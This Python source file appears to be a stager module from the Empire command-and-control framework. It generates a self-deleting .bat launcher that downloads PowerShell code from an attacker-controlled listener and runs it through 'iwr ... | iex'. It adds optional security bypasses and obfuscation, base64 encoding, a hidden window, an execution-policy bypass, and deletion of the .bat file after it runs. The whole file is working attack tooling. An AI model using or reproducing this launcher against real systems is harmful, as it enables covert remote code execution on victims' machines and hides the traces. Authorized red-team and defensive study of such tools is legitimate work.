import logging
from textwrap import dedent

from empire.server.common.helpers import enc_powershell
from empire.server.core.db import models
from empire.server.core.db.base import SessionLocal

log = logging.getLogger(__name__)


class Stager:
    def __init__(self, mainMenu):
        self.info = {
            "Name": "BAT Launcher",
            "Authors": [
                {
                    "Name": "Will Schroeder",
                    "Handle": "@harmj0y",
                    "Link": "https://twitter.com/harmj0y",
                }
            ],
            "Description": "Generates a self-deleting .bat launcher for Empire. Only works with the HTTP and HTTP COM listeners.",
            "Comments": [""],
        }

        self.options = {
            "Listener": {
                "Description": "Listener to generate stager for.",
                "Required": True,
                "Value": "",
            },
            "Language": {
                "Description": "Language of the stager to generate.",
                "Required": True,
                "Value": "powershell",
                "SuggestedValues": ["powershell", "csharp", "ironpython", "go"],
                "Strict": True,
            },
            "OutFile": {
                "Description": "Filename that should be used for the generated output, otherwise returned as a string.",
                "Required": True,
                "Value": "launcher.bat",
            },
            "Delete": {
                "Description": "Delete .bat after running.",
                "Required": False,
                "Value": "True",
                "SuggestedValues": ["True", "False"],
                "Strict": True,
            },
            "Obfuscate": {
                "Description": "Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.",
                "Required": False,
                "Value": "False",
                "SuggestedValues": ["True", "False"],
                "Strict": True,
            },
            "ObfuscateCommand": {
                "Description": "The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.",
                "Required": False,
                "Value": r"Token\All\1",
            },
            "Bypasses": {
                "Description": "Bypasses as a space separated list to be prepended to the launcher",
                "Required": False,
                "Value": "",
            },
        }

        self.mainMenu = mainMenu

    def generate(self):
        options = self.options
        listener_name = options["Listener"]["Value"]
        obfuscate_command = options["ObfuscateCommand"]["Value"]
        bypasses = options["Bypasses"]["Value"]
        language = options["Language"]["Value"]

        listener = self.mainMenu.listenersv2.get_by_name(SessionLocal(), listener_name)
        host = listener.options["Host"]["Value"]

        obfuscate = options["Obfuscate"]["Value"].lower() == "true"

        delete = options["Delete"]["Value"].lower() == "true"

        if not host:
            log.error("[!] Error in launcher command generation.")
            return ""

        launcher = ""
        if listener.module in ["http"]:
            if language == "powershell":
                launcher_ps = f"(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('{listener.host_address}download/powershell/')-UseBasicParsing|iex"

                with SessionLocal.begin() as db:
                    for bypass_name in bypasses.split(" "):
                        bypass = (
                            db.query(models.Bypass)
                            .filter(models.Bypass.name == bypass_name)
                            .first()
                        )

                        if bypass:
                            if bypass.language == language:
                                launcher_ps = bypass.code + launcher_ps
                            else:
                                log.warning(
                                    f"Invalid bypass language: {bypass.language}"
                                )

                launcher_ps = (
                    self.mainMenu.obfuscationv2.obfuscate(
                        launcher_ps, obfuscate_command
                    )
                    if obfuscate
                    else launcher_ps
                )
                launcher_ps = enc_powershell(launcher_ps).decode("UTF-8")
                launcher = f"powershell.exe -nop -ep bypass -w 1 -enc {launcher_ps}"

            elif language in ["csharp", "ironpython"]:
                oneliner = self.mainMenu.stagergenv2.generate_exe_oneliner(
                    language=language,
                    obfuscate=obfuscate,
                    obfuscation_command=obfuscate_command,
                    encode=True,
                    listener_name=listener_name,
                )
                launcher = f"powershell.exe -nop -ep bypass -w 1 -enc {oneliner.split('-enc ')[1]}"
            elif language == "go":
                launcher = self.mainMenu.stagergenv2.generate_go_exe_oneliner(
                    language=language,
                    obfuscate=obfuscate,
                    obfuscation_command=obfuscate_command,
                    encode=True,
                    listener_name=listener_name,
                )

        elif language == "powershell":
            launcher = self.mainMenu.stagergenv2.generate_launcher(
                listener_name=listener_name,
                language="powershell",
                encode=True,
                obfuscate=obfuscate,
                obfuscation_command=obfuscate_command,
            )

        MAX_CHARACTERS = 8192
        if len(launcher) > MAX_CHARACTERS:
            log.error("[!] Error: launcher code is greater than 8192 characters.")
            return ""

        code = dedent(
            f"""
            @echo off
            start /B {launcher}
            """
        ).strip()

        if delete:
            code += "\n"
            code += dedent(
                """
                timeout /t 1 > nul
                del "%~f0"
                """
            ).strip()

        return code
